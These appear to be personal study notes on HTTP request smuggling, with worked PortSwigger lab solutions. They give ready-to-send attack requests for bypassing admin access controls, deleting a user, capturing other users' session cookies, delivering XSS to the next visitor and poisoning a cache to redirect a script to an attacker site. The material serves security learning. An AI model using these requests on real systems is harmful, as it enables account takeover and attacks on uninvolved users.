## Definition
technique for interfering with the way:
- a web site processes sequences of HTTP requests 
- that are received from one or more users

- is primarily associated with HTTP/1 requests
  (websites that support HTTP/2 may be vulnerable)

## How it works
Today's web apps:
- frequently employ chains of HTTP servers between users and the ultimate app logic.
- =>
	- Users send requests to a front-end server 
	- this server forwards requests to one or more back-end servers

When the front-end server forwards HTTP requests to a back-end server:
- it typically sends several requests over the same back-end network connection
	- because this is much more efficient and performant.

it is crucial that:
- the front-end and back-end systems agree about the boundaries between requests

Otherwise, an attacker might be able to:
- send an ambiguous request 
	- that gets interpreted differently by the front-end and back-end systems

## How arise
Most HTTP request smuggling vulnerabilities arise because:
- the HTTP/1 specification provides 2 different ways to specify where a request ends: 
	- the `Content-Length` header -->  it specifies the length of the message body in bytes
	- the `Transfer-Encoding` header

### Transfer-Encoding header
Can be used to -->  specify that the message body uses chunked encoding
=>
This means that the message body:
- contains one or more chunks of data. 
- Each chunk consists of:
	- the chunk size in bytes (expressed in hexadecimal),
	- followed by a newline,
	- followed by the chunk contents
	  
- The message is terminated with a chunk of size zero.

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```


As the HTTP/1 spec provides 2 different methods for specifying the length of HTTP mex:
- it is possible for a single message to use 
	- both methods at once, 
		- such that they conflict with each other.

The specification attempts to prevent this problem by:
- stating that if both the `Content-Length` and `Transfer-Encoding` headers are present:
	- then the `Content-Length` header should be ignored. 

This might be sufficient to avoid ambiguity when:
- only a single server is in play,
- but not when 2 or more servers are chained together
	- In this situation, problems can arise for two reasons:
		- Some servers do not support the `Transfer-Encoding` header in requests.
		- Some servers that do support the `Transfer-Encoding` header can be induced not to process it if the header is obfuscated in some way
		  
If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) `Transfer-Encoding` header:
=>
they might disagree about:
- the boundaries between successive requests, 
	- leading to request smuggling vulnerabilities.

## How to perform an HTTP request smuggling attack
Classic request smuggling attacks involve:
- placing both the `Content-Length` header and the `Transfer-Encoding` header 
	- into a single HTTP/1 request 
	  
- manipulating these so that the front-end and back-end servers process the request differently

The exact way in which this is done depends on the behavior of the two servers:
- CL.TE: 
	- the front-end server uses the `Content-Length` header 
	- the back-end server uses the `Transfer-Encoding` header
	  
- TE.CL: 
	- the front-end server uses the `Transfer-Encoding` header 
	- the back-end server uses the `Content-Length` header
	  
- TE.TE:
	- the front-end and back-end servers both support the `Transfer-Encoding` header, but:
		- one of the servers can be induced not to process it by obfuscating the header in some way

### CL.TE vulnerabilities
- the front-end server uses the `Content-Length` header 
- the back-end server uses the `Transfer-Encoding` header
=>
We can perform a simple HTTP request smuggling attack as follows:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- The front-end server processes the `Content-Length` header 
	- determines that the request body is 13 bytes long, up to the end of `SMUGGLED`.
	- This request is forwarded on to the back-end server.

- The back-end server processes the `Transfer-Encoding` header
	- treats the message body as using chunked encoding. 
	  =>
	- It processes the first chunk, which is stated to be zero length:
		- so is treated as terminating the request
		  
	- The following bytes, `SMUGGLED`, are left unprocessed:
		- the back-end server will treat these as being the start of the next request in the sequence

#### HTTP request smuggling, basic CL.TE vulnerability
Using Burp Repeater, issue the following request twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Before sending the 2 packets:
- nella rotella di fianco al bottone send, deseleziona Update Content-Length
- in the Inspector tab inside Repeater on the right, click on:
	- Request attributes > Protocol > HTTP 1

### TE.CL vulnerabilities
- the front-end server uses the `Transfer-Encoding` header 
- the back-end server uses the `Content-Length` header

We can perform a simple HTTP request smuggling attack as follows:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

- The front-end server processes the `Transfer-Encoding` header
	- so treats the message body as using chunked encoding. 
	- It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`.
	- It processes the second chunk, which is stated to be zero length
		- so is treated as terminating the request. 
		- This request is forwarded on to the back-end server.

- The back-end server processes the `Content-Length` header
- determines that the request body is 3 bytes long, up to the start of the line following `8`.
- The following bytes, starting with `SMUGGLED`, are left unprocessed
- the back-end server will treat these as being the start of the next request in the sequence

#### HTTP request smuggling, basic TE.CL vulnerability
In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
you need the 2 `\n` at the end -->  bc each HTTP packet must terminate with `\r\n`

### TE.TE behavior: obfuscating the TE header
- the front-end and back-end servers both support the `Transfer-Encoding` header
- but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the `Transfer-Encoding` header. 
For example:
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### HTTP request smuggling, obfuscating the TE header
send twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


## Finding HTTP request smuggling vulnerabilities
### Finding using timing techniques
The most generally effective way to detect HTTP request smuggling vulnerabilities is to:
- send requests that will cause
	- a time delay in the application's responses if a vulnerability is present

#### CL.TE
If an app is vulnerable to the CL.TE variant of request smuggling:
=>
sending a request like the following will often cause a time delay:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X


```

Since the front-end server uses the `Content-Length` header:
- it will forward only part of this request, omitting the `X`

The back-end server uses the `Transfer-Encoding` header:
=>
- processes the first chunk
- and then waits for the next chunk to arrive. 
- This will cause an observable time delay

#### TE.CL
time delay with this:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X


```

Since the front-end server uses the `Transfer-Encoding` header:
- it will forward only part of this request, omitting the `X`

The back-end server uses the `Content-Length` header:
- expects more content in the message body
  =>
- waits for the remaining content to arrive. 
- This will cause an observable time delay.

### Confirming vulnerabilities using differential responses
When a probable request smuggling vulnerability has been detected:
- you can obtain further evidence for the vulnerability by:
	- exploiting it to trigger differences in the contents of the application's responses.
=>
This involves sending 2 requests to the application in quick succession:
- An "attack" request 
	- that is designed to interfere with the processing of the next request
	  
- A "normal" request.

If the response to the normal request:
- contains the expected interference =>  the vulnerability is confirmed.
  
#### Confirming CL.TE
Send:
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x


```

If the attack is successful:
- then the last two lines of this request:
	- are treated by the back-end server as belonging to the next request that is received
	  
- This will cause the subsequent "normal" request to look like this:
  ![[Pasted image 20240923150532.png|400]]


Since this request now contains an invalid URL:
- the server will respond with status code 404
- indicating that the attack request did indeed interfere with it.

##### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Send twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X


```

#### Confirming TE.CL
Send:
```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```
If the attack is successful:
- everything from `GET /404` onwards:
	- is treated by the back-end server as belonging to the next request that is received
	=>
	This will cause the subsequent "normal" request to look like this:
		![[Pasted image 20240923150828.png|400]]
Since this request now contains an invalid URL:
- the server will respond with status code 404
	- indicating that the attack request did indeed interfere with it

##### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Send twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

The second request should receive an HTTP 404 response



Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:
- The "attack" request and the "normal" request should be sent to the server using different network connections. 
	- Sending both through the same connection won't prove that the vulnerability exists.
	  
- The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. 
  
- When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. 
  =>
	- You should send the "normal" request immediately after the "attack" request. 
	- If the app is busy:
		- you might need to perform multiple attempts to confirm the vulnerability
	  
- In some apps, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. 
	- If your "attack" and "normal" requests are forwarded to different back-end systems
	  =>
		- then the attack will fail.
		- This is an additional reason why you might need to try several times before a vulnerability can be confirmed
		  
- If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference:
  =>
	- this means that another app user was affected by your attack. 
	- If you continue performing the test:
		- this could have a disruptive effect on other users, and you should exercise caution


## Exploiting
### Bypass front-end security controls
In some apps:
- the front-end web server is used to implement some security controls
- deciding whether to allow individual requests to be processed

Allowed requests are:
- forwarded to the back-end server, 
	- where they are deemed to have passed through the front-end controls.

For example, suppose an app uses:
- the front-end server to implement access control restrictions
	- only forwarding requests if the user is authorized to access the requested URL. 

- The back-end server then honors every request without further checking.
=>
In this situation, an HTTP request smuggling vulnerability can be used to:
- bypass the access controls -->  by smuggling a request to a restricted URL.

Suppose the current user is permitted to access `/home` but not `/admin`. 
They can bypass this restriction using the following request smuggling attack:
![[Pasted image 20240923151948.png]]
=>
- The front-end server sees two requests here, 
	- both for `/home`, 
	- so the requests are forwarded to the back-end server.
	  
- However, the back-end server sees:
	- one request for `/home` 
	- one request for `/admin`

It assumes (as always) that:
- the requests have passed through the front-end controls
- so grants access to the restricted URL.

#### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
1. Try to visit `/admin` and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

1. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
2. Issue the following request twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

1. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
2. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

1. Observe that you can now access the admin panel.
2. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:
   => change the URL to `/admin/delete?username=carlos`

#### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
1. Try to visit `/admin` and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

1. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
2. Issue the following request twice:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

1. Observe that you can now access the admin panel.
2. Using the previous response as a reference, change the smuggled request URL to delete `carlos`:
   change URL in -->  `/admin/delete?username=carlos`


### Revealing front-end request rewriting
In many app, the front-end server:
- performs some rewriting of requests 
- before they are forwarded to the back-end server,
	- typically by adding some additional request headers

For example, the front-end server might:
- terminate the TLS connection 
	- add some headers describing the protocol and ciphers that were used
	  
- add an `X-Forwarded-For` header containing the user's IP address;
- determine the user's ID based on their session token 
	- add a header identifying the user; 
- or add some sensitive information that is of interest for other attacks

=>
if you try to smuggle but you don't insert all the headers that the packet should have
=>
your attack will fail

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:
- Find a POST request that reflects the value of a request parameter into the app's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server
	- followed directly by a normal request whose rewritten form you want to reveal.

Suppose an app has a login function that reflects the value of the `email` parameter:
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

This results in a response containing the following:
```html
<input id="email" value="wiener@normal-user.net" type="text">
```

Here you can use the following request smuggling attack:
- to reveal the rewriting that is performed by the front-end server:
  ![[Pasted image 20240923154040.png|400]]

The requests will be rewritten by the front-end server:
- to include the additional headers
- then the back-end server will process the smuggled request 
- and treat the rewritten second request as being the value of the `email` parameter.
- It will then reflect this value back in the response to the second request

Since the final request is being rewritten,:
- you don't know how long it will end up. 
- The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is.
  =>
	- If you set this value too short:
		- you will receive only part of the rewritten request;
		  
	- if you set it too long
		- the back-end server will time out waiting for the request to complete
=>
the solution is to:
- guess an initial value that is a bit bigger than the submitted request
- then gradually increase the value to retrieve more information
	- until you have everything of interest

#### Exploiting HTTP request smuggling to reveal front-end request rewriting
1. Browse to `/admin` and observe that the admin panel can only be loaded from `127.0.0.1`.
2. Use the site's search function and observe that it reflects the value of the `search` parameter.
3. Use Burp Repeater to issue the following request twice.
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```


1. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
2. Make a note of the name of the `X-*-IP` header in the rewritten request, and use it to access the admin panel:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-whatYouFound-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

- Using the previous response as a reference, change the smuggled request URL to delete the user `carlos`:
	- change URL in `/admin/delete?username=carlos`

### Capturing other users' requests
If the app contains any kind of functionality that allows you to store and later retrieve textual data:
=>
- you can potentially use this to:
	- capture the contents of other users' requests. 
	  
	- These may include session tokens or other sensitive data submitted by the user.
	- Suitable functions to use as the vehicle for this attack would be:
		- comments, emails, profile descriptions, screen names, and so on.

To perform the attack, you need to:
- smuggle a request that submits data to the storage function, 
	- with the parameter containing the data to store positioned last in the request. 

For example, suppose an app uses the following request to submit a blog post comment:
- which will be stored and displayed on the blog:
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

Now consider what would happen if you:
- smuggle an equivalent request 
	- with an overly long `Content-Length` header 
	- and the `comment` parameter positioned at the end of the request as follows:
```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

The `Content-Length` header of the smuggled request:
- indicates that the body will be 400 bytes long, 
- but we've only sent 144 bytes. 
=>
- In this case, the back-end server:
	- will wait for the remaining 256 bytes before issuing the response
	- or else issue a timeout if this doesn't arrive quick enough
	  
- As a result:
	- when another request is sent to the back-end server down the same connection:
		- the first 256 bytes are effectively appended to the smuggled request as follows:![[Pasted image 20240923160025.png]]

As the start of the victim's request is contained in the `comment` parameter:
- this will be posted as a comment on the blog
	- enabling you to read it simply by visiting the relevant post.

To capture more of the victim's request, you just need to:
- increase the value of the smuggled request's `Content-Length` header accordingly,
- but note that this will involve:
	- a certain amount of trial and error
	  
- If you encounter a timeout:
  =>
	- the `Content-Length` you've specified is higher than the actual length of the victim's request. 
	- In this case, simply reduce the value until the attack works again

#### Exploiting HTTP request smuggling to capture other users' requests
1. Visit a blog post and post a comment.
2. Send the `comment-post` request to Burp Repeater, shuffle the body parameters so the `comment` parameter occurs last, and make sure it still works.
3. Increase the `comment-post` request's `Content-Length` to 400, then smuggle it to the back-end server:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

1. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
2. Copy the user's Cookie header from the comment, and use it to access their account.


### Exploit reflected XSS
If an application is vulnerable to HTTP request smuggling and also contains reflected XSS:
- you can use a request smuggling attack to:
	- hit other users of the application

This approach is superior to normal exploitation of reflected XSS in 2 ways:
- It requires no interaction with victim users. 
	- You don't need to feed them a URL and wait for them to visit it. 
	- You just smuggle a request containing the XSS payload 
		- and the next user's request that is processed by the back-end server will be hit.
		  
- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.

For example, suppose an app has a reflected XSS vulnerability in the `User-Agent` header. 
=>
You can exploit this in a request smuggling attack as follows:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

The next user's request:
- will be appended to the smuggled request
- and they will receive the reflected XSS payload in the response.

#### Exploiting HTTP request smuggling to deliver reflected XSS
1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your `User-Agent` header in a hidden input.
3. Inject an XSS payload into the `User-Agent` header and observe that it gets reflected:
   `"/><script>alert(1)</script>`
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```
### Perform web cache poisoning
In a variation of the preceding attack:
- it might be possible to exploit HTTP request smuggling to perform
	- a web cache poisoning attack
=>
If any part of the front-end infrastructure performs caching of content:
- it might be possible to poison the cache with the off-site redirect response. 
- This will make the attack persistent, 
	- affecting any user who subsequently requests the affected URL.

In this variant, the attacker sends all of the following to the front-end server:
![[Pasted image 20240923170903.png|400]]

The smuggled request:
- reaches the back-end server,
	- which responds as before with the off-site redirect

The front-end server:
- caches this response against what it believes is the URL in the second request,
	- which is `/static/include.js`:
```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
From this point onwards, when other users request this URL:
- they receive the redirection to the attacker's web site

#### Exploiting HTTP request smuggling to perform web cache poisoning




